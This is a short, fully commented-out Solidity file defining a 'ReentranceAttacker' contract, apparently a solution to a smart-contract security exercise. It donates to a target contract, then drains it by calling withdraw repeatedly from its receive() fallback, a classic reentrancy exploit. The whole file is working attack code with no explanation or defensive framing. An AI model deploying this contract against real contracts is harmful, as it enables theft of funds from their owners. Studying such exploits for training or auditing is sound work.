// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.12;

// interface IReentranceContract {
//   function donate(address) external payable;
//   function withdraw(uint) external;
//   function balanceOf(address) external view returns(uint);
// }

// contract ReentranceAttacker {

//   address public reentranceContract;

//   constructor(address _reentranceContract) public {
//     reentranceContract = _reentranceContract;
//   }

//   function donate() external payable {
//     IReentranceContract(reentranceContract).donate{value: msg.value}(address(this));
//   }

//   function drainFunds() external {
//     uint256 balance = IReentranceContract(reentranceContract).balanceOf(address(this));
//     IReentranceContract(reentranceContract).withdraw(balance);
//   }

//   receive() external payable {
//     uint256 balance = reentranceContract.balance;
//     IReentranceContract(reentranceContract).withdraw(balance);
//   }
// }